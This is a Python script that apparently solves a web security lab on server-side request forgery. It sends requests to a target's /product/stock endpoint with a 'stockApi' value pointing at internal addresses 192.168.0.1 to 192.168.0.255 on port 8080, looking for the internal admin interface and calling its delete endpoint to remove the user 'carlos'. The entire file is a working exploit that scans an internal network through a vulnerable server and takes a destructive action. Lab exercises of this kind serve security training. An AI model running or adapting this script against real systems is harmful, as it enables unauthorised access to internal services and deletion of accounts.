import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)

    base_url = sys.argv[1] + '/product/stock'
    burp_headers = {}

    ip_base = "192.168.0."
    ip_suffix = 1
    success = False

    while not success and ip_suffix <= 255:
        stock_api_url = f"http://{ip_base}{ip_suffix}:8080/admin/delete?username=carlos"
        burp_data = {"stockApi": stock_api_url}
        response = requests.post(base_url, headers=burp_headers, data=burp_data)
        
        if response.status_code == 302:
            success = True
        else:
            ip_suffix += 1

    if not success:
        sys.exit(1)
